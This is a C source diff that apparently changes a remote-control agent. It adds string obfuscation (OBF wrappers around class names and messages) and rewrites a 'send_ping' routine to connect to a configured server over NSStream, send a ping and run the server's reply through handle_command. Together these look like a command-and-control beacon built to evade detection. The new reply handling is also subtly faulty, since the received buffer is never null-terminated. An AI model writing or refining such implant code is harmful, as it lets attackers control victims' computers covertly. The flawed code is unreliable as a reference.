@@ -1,4 +1,5 @@
 #include "runtime/kit.h"
+#include "runtime/obf.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -63,34 +64,51 @@ static void handle_command(const char* command) {
 }
 
 static bool send_ping(RTKContext* ctx) {
-    // Create socket
-    RTKInstance socket = rtk_create_instance(ctx, "NSSocket");
-    if (!socket) {
-        fprintf(stderr, "Failed to create socket: %s\n", rtk_get_error(ctx));
+    // Create input and output streams
+    RTKInstance inputStream = NULL;
+    RTKInstance outputStream = NULL;
+
+    // Get NSStream class
+    RTKClass streamClass = rtk_get_class(ctx, OBF("NSStream"));
+    if (!streamClass) {
+        fprintf(stderr, OBF("Failed to get NSStream class: %s\n"), rtk_get_error(ctx));
         return false;
     }
 
-    // Create host
-    RTKClass hostClass = rtk_get_class(ctx, "NSHost");
-    if (!hostClass) {
-        fprintf(stderr, "Failed to get NSHost class: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, socket);
+    // Create NSString for hostname
+    RTKInstance hostString = rtk_string_create(ctx, config.server_host);
+    if (!hostString) {
+        fprintf(stderr, "Failed to create host string: %s\n", rtk_get_error(ctx));
         return false;
     }
 
-    RTKInstance host = rtk_msg_send_class_str(ctx, hostClass, "hostWithName:", config.server_host);
-    if (!host) {
-        fprintf(stderr, "Failed to create host: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, socket);
+    // Create port number
+    char port_str[16];
+    snprintf(port_str, sizeof(port_str), "%d", config.server_port);
+    RTKInstance portNumber = rtk_msg_send_class_str(ctx, rtk_get_class(ctx, "NSNumber"),
+                                                   "numberWithInt:", port_str);
+    if (!portNumber) {
+        fprintf(stderr, "Failed to create port number: %s\n", rtk_get_error(ctx));
+        rtk_release(ctx, hostString);
         return false;
     }
 
-    // Connect
-    if (!rtk_msg_send_obj(ctx, socket, "connectToHost:port:", host)) {
-        fprintf(stderr, "Failed to connect: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, socket);
+    // Create streams using the modern API with hostname string
+    if (!rtk_msg_send_stream(ctx, streamClass, "getStreamsToHostWithName:port:inputStream:outputStream:",
+                            hostString, portNumber, &inputStream, &outputStream)) {
+        fprintf(stderr, "Failed to create streams: %s\n", rtk_get_error(ctx));
+        rtk_release(ctx, hostString);
+        rtk_release(ctx, portNumber);
         return false;
     }
+
+    // Release resources we no longer need
+    rtk_release(ctx, hostString);
+    rtk_release(ctx, portNumber);
+
+    // Open streams
+    rtk_msg_send_empty(ctx, inputStream, "open");
+    rtk_msg_send_empty(ctx, outputStream, "open");
 
     // Send ping
     char ping_msg[512];
@@ -99,28 +117,28 @@ static bool send_ping(RTKContext* ctx) {
     RTKInstance data = rtk_data_create(ctx, ping_msg, strlen(ping_msg));
     if (!data) {
         fprintf(stderr, "Failed to create data: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, socket);
+        rtk_release(ctx, inputStream);
+        rtk_release(ctx, outputStream);
         return false;
     }
 
-    if (!rtk_msg_send_data(ctx, socket, "writeData:", data)) {
+    if (!rtk_msg_send_data_length(ctx, outputStream, "write:maxLength:", data, strlen(ping_msg))) {
         fprintf(stderr, "Failed to send data: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, socket);
+        rtk_release(ctx, inputStream);
+        rtk_release(ctx, outputStream);
         return false;
     }
 
     // Read response
-    RTKInstance response = rtk_msg_send_empty(ctx, socket, "readDataToEndOfFile");
+    uint8_t buffer[4096];
+    RTKInstance response = rtk_msg_send_buf_length(ctx, inputStream, "read:maxLength:",
+                                                  buffer, sizeof(buffer));
     if (response) {
-        size_t length;
-        char buffer[4096];
-        if (rtk_data_get_bytes(ctx, response, buffer, sizeof(buffer), &length)) {
-            buffer[length] = '\0';
-            handle_command(buffer);
-        }
+        handle_command((char*)buffer);
     }
 
-    rtk_release(ctx, socket);
+    rtk_release(ctx, inputStream);
+    rtk_release(ctx, outputStream);
     return true;
 }
 
